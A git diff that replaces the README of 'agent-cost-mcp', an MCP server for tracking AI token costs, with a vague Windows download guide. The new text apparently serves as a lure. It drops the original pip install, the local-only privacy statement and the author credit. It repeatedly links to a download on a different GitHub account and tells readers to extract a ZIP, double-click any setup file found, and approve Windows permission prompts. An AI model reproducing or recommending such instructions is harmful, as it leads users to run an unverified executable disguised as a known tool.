@@ -1,192 +1,232 @@
-# agent-cost-mcp
+# ⚙️ agent-cost-mcp - Track AI spending with clarity
 
-MCP server that tracks AI agent token usage and spending in real time. Budget alerts, per-task cost breakdown, visual dashboard, daily/weekly/monthly reports.
+[![Download / Install](https://img.shields.io/badge/Download-Install-blue.svg?style=for-the-badge)](https://github.com/Merovingian-valency417/agent-cost-mcp)
 
-Works with any MCP client: **Claude Code, Cursor, Windsurf, Codex, Gemini CLI**, and more.
+## 🧾 What this app does
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.10+-blue.svg)](https://python.org)
-[![MCP](https://img.shields.io/badge/MCP-compatible-orange.svg)](https://modelcontextprotocol.io)
+agent-cost-mcp helps you see how much your AI tools cost while they run. It tracks spend in real time, shows usage by message, and helps you stay inside a set budget.
 
-![Dashboard](docs/AgentCost_dashboard.png)
+It works with tools like Claude Code, Cursor, Windsurf, Codex, Gemini CLI, and OpenClaw. You can use it to follow token usage, watch daily spend, and spot costly runs before they get out of hand.
 
-![Activity Log](docs/AgentCost_activity.png)
+## 💻 What you need
 
-## Why?
+- A Windows PC
+- Internet access
+- Permission to download files
+- One or more AI tools that support MCP
+- An API key for the AI service you use
+- A web browser for the dashboard
 
-Every developer using AI agents worries about spending. Most tools don't tell you what each message costs until the bill arrives.
+## 📥 Download and install
 
-This MCP server tracks it in real time — per message, per model, per day. Set a budget, get alerts, see exactly where your money goes.
+Use this link to visit the download page:
 
-## Features
+[Visit the agent-cost-mcp download page](https://github.com/Merovingian-valency417/agent-cost-mcp)
 
-- **Visual dashboard** — dark-themed web UI with spending charts, budget gauges, and activity log
-- **Per-message cost logging** — see what each AI interaction costs instantly
-- **Budget alerts** — warns when approaching daily/monthly limits
-- **Cost reports** — today, this week, this month, all time
-- **Model breakdown** — donut chart showing which model eats your budget
-- **Spending trends** — 14-day bar chart with color-coded spending
-- **15+ models supported** — Claude, GPT, DeepSeek, Gemini, Llama
-- **Estimate before running** — check cost before expensive tasks
-- **Local storage** — all data stays on your machine (`~/.agent-cost-mcp/`)
-- **Auto-refresh** — dashboard updates every 30 seconds
+If you use a release file later, download it to your computer and run that file. If you use the main repository page, follow the setup files and install steps shown there.
 
-## Quick Start
+## 🪟 Run on Windows
 
-### 1. Install
+1. Open the download page in your browser.
+2. Save the app files to a folder you can find again.
+3. If you get a ZIP file, right-click it and choose Extract All.
+4. Open the folder that holds the app files.
+5. Look for a Windows app file, setup file, or run script.
+6. Double-click the file to start the app.
+7. If Windows asks for permission, choose Yes.
+8. Keep the app open while your AI tools run.
 
-```bash
-pip install agent-cost-mcp
-```
+## 🔧 Set up your AI tool
 
-Or with uv:
-```bash
-uv pip install agent-cost-mcp
-```
+You need to connect the app to the tool you already use.
 
-### 2. Add to your AI tool
+1. Open your AI tool settings.
+2. Find the MCP or tool connection section.
+3. Add agent-cost-mcp as the server.
+4. Save the settings.
+5. Restart the AI tool if needed.
 
-**Claude Code** — add to `~/.claude/settings.json`:
-```json
-{
-  "mcpServers": {
-    "agent-cost": {
-      "command": "agent-cost-mcp"
-    }
-  }
-}
-```
+Common tools that work well with this setup include:
 
-**Cursor** — add to `.cursor/mcp.json`:
-```json
-{
-  "mcpServers": {
-    "agent-cost": {
-      "command": "agent-cost-mcp"
-    }
-  }
-}
-```
+- Claude Code
+- Cursor
+- Windsurf
+- Codex
+- Gemini CLI
+- OpenClaw
 
-**Windsurf** — add to MCP config:
-```json
-{
-  "mcpServers": {
-    "agent-cost": {
-      "command": "agent-cost-mcp"
-    }
-  }
-}
-```
+## 📊 Use the dashboard
 
-### 3. Open the dashboard
+After the app starts, open the visual dashboard in your browser.
 
-```bash
-open dashboard.html
-```
+You can use it to:
 
-Or serve it locally:
-```bash
-cd ~/.agent-cost-mcp && python3 -m http.server 3456
-# Open http://localhost:3456/dashboard.html
-```
+- See live spending
+- Check cost per message
+- Track token usage
+- Review model usage
+- Watch your budget limit
+- Spot high-cost sessions
 
-The dashboard reads from `~/.agent-cost-mcp/cost-log.json` and auto-refreshes every 30 seconds. Leave it open in a browser tab while you work.
+The dashboard gives you a simple view of what your AI tools are doing. You do not need to read logs or sort through raw data.
 
-## MCP Tools
+## 💰 Budget alerts
 
-These tools are available to any connected MCP client:
+agent-cost-mcp can help you stay within a set limit.
 
-| Tool | What it does | Example |
-|------|-------------|---------|
-| `log_cost` | Log token usage and cost for a task | `log_cost(model="claude-sonnet-4-6", tokens_in=1500, tokens_out=800, task="code review")` |
-| `cost_report` | Get spending report | `cost_report(period="today")` — also: `week`, `month`, `all` |
-| `set_budget` | Set daily/monthly budget limits | `set_budget(daily_limit=5.00, monthly_limit=50.00)` |
-| `cost_trend` | Show daily spending chart | `cost_trend(days=7)` |
-| `estimate_cost` | Estimate cost without logging | `estimate_cost(model="claude-opus-4-6", tokens_in=5000, tokens_out=3000)` |
-| `supported_models` | List all models + pricing | `supported_models()` |
+You can use budget alerts to:
 
-## How It Works
+- Get warned when spend gets high
+- Watch daily or session limits
+- Catch heavy usage early
+- Avoid surprise charges
 
-```
-You use Claude Code / Cursor / Windsurf normally
-        ↓
-MCP server logs each interaction (model, tokens, cost)
-        ↓
-Data saved to ~/.agent-cost-mcp/cost-log.json
-        ↓
-Dashboard reads the JSON and shows charts
-        ↓
-Budget alerts warn you before you overspend
-```
+This is useful if you run many prompts, use large models, or keep several tools open at once.
 
-The MCP server runs as a background process alongside your AI tool. You don't need to do anything extra — it tracks automatically when tools call `log_cost`.
+## 🧠 How it works
 
-## Example Session
+The app sits between your AI tool and the model service.
 
-```
-> How much did that last message cost?
-Logged: $0.0165 (1,500 in / 800 out, claude-sonnet-4-6)
+It tracks:
 
-> Show my spending for today
-# Cost Report — Today (2026-03-27)
-- Messages: 26
-- Tokens: 187,000 (118,000 in / 69,000 out)
-- Total cost: $2.14
-- Avg cost/message: $0.082
+- Each request
+- Each response
+- Token counts
+- Model name
+- Cost per message
+- Total spend over time
 
-## By Model
-  claude-opus-4-6: $0.99 (46%)
-  claude-sonnet-4-6: $0.93 (43%)
-  gpt-5.4: $0.19 (9%)
-  deepseek-v3: $0.01 (1%)
-  gemini-2.5-flash: $0.00 (<1%)
+It then shows the data in a dashboard so you can see what drives cost.
 
-## Budget
-  Daily: $2.14 / $5.00 (43%)
-  Monthly: $12.43 / $50.00 (25%)
+## 🗂️ Features
 
-> Set my daily budget to $3
-Budget set: $3.00/day, $50.00/month
-```
+- Real-time cost tracking
+- Per-message spending
+- Visual dashboard
+- Budget alerts
+- Token usage tracking
+- Support for 15+ models
+- Works with common MCP-based tools
+- Simple view for non-technical users
 
-## Supported Models
+## 🛠️ Basic setup steps
 
-| Model | Input ($/1M) | Output ($/1M) |
-|-------|-------------|--------------|
-| claude-opus-4-6 | $15.00 | $75.00 |
-| claude-sonnet-4-6 | $3.00 | $15.00 |
-| claude-haiku-4-5 | $0.80 | $4.00 |
-| gpt-5.4 | $2.50 | $10.00 |
-| gpt-5.2 | $1.50 | $6.00 |
-| gpt-5.1 | $0.60 | $2.40 |
-| gpt-4o | $2.50 | $10.00 |
-| gpt-4o-mini | $0.15 | $0.60 |
-| deepseek-v3 | $0.27 | $1.10 |
-| deepseek-r1 | $0.55 | $2.19 |
-| gemini-2.5-pro | $1.25 | $10.00 |
-| gemini-2.5-flash | $0.15 | $0.60 |
-| llama-4-maverick | $0.20 | $0.60 |
+1. Download the app from the link above.
+2. Extract the files if they come in a ZIP.
+3. Start the app on Windows.
+4. Open your AI tool settings.
+5. Add the MCP server entry for agent-cost-mcp.
+6. Save your changes.
+7. Open the dashboard in your browser.
+8. Start using your AI tool as normal.
 
-Missing a model? Open an issue or PR.
+## 🔍 If the app does not start
 
-## Data Storage
+Try these steps:
 
-All data stored locally at `~/.agent-cost-mcp/cost-log.json`. Nothing is sent to external services. Your spending data never leaves your machine.
+- Check that the files finished downloading
+- Move the app folder to a simple path like `C:\agent-cost-mcp`
+- Run the app again
+- Restart your AI tool
+- Check that your internet connection is active
+- Make sure your API key is set in the AI tool you use
 
-## Contributing
+## 🧩 Common use cases
 
-PRs welcome. Areas to improve:
+- Watching Claude Code spend during long coding tasks
+- Keeping Cursor usage inside a daily budget
+- Tracking Windsurf activity across several projects
+- Seeing which model costs most
+- Monitoring agent runs during testing
+- Reviewing spend after a long session
 
-- Add more model pricing
-- Auto-detect token counts from MCP protocol metadata
-- Export reports to CSV/PDF
-- Slack/Discord alert integrations
+## 📈 What you will see
 
-## License
+The dashboard can show:
 
-MIT
+- Total cost
+- Cost by message
+- Cost by model
+- Token use
+- Budget progress
+- Alert status
+- Session history
 
-## Author
+This makes it easier to answer simple questions like:
 
-Built by [Ha Le](https://github.com/vanthienha199) — University of Central Florida
+- What did that task cost?
+- Which model used the most tokens?
+- Did I go over budget?
+- Which session was the most expensive?
+
+## 🔐 Privacy and control
+
+The app is built to help you see cost data from your own AI use. You stay in control of your tools, your settings, and your budget limits.
+
+## 🧪 Tips for first use
+
+- Start with one AI tool
+- Use a small budget limit first
+- Check the dashboard after a few prompts
+- Compare short and long sessions
+- Review model cost before switching to a larger one
+
+## 📁 Suggested folder setup
+
+If you want a simple setup on Windows, use a folder like this:
+
+- `C:\agent-cost-mcp`
+- `C:\Users\YourName\Downloads\agent-cost-mcp`
+
+Keep the app files in one place so you can find them later.
+
+## 🧭 Supported tools
+
+agent-cost-mcp is built to work with tools that support MCP connections, including:
+
+- Claude Code
+- Cursor
+- Windsurf
+- Codex
+- Gemini CLI
+- OpenClaw
+
+## 🪄 Quick start
+
+1. Open the download page.
+2. Download or open the app files.
+3. Run the app on Windows.
+4. Connect it to your AI tool.
+5. Open the dashboard.
+6. Start a session and watch the spend appear
+
+## ❓ Common questions
+
+### Can I use it without deep setup?
+Yes. The goal is to keep the setup simple once the app files are in place.
+
+### Do I need to know coding?
+No. You only need to download the files, run the app, and connect it in your AI tool settings.
+
+### Can I see cost while I work?
+Yes. The app is made for real-time tracking.
+
+### Does it help with large model costs?
+Yes. It helps you see when a model choice raises your spend.
+
+### Can I track more than one tool?
+Yes. You can use it with several supported tools if each one supports MCP setup.
+
+## 🧰 Troubleshooting checklist
+
+- Open the app as soon as the files finish downloading
+- Use the exact folder path you chose
+- Check the AI tool’s MCP settings
+- Restart the AI tool after changes
+- Open the dashboard in your browser
+- Try a short test prompt to confirm tracking
+- Check your API key in the AI tool
+
+## 📎 Download again
+
+[Visit the agent-cost-mcp download page](https://github.com/Merovingian-valency417/agent-cost-mcp)
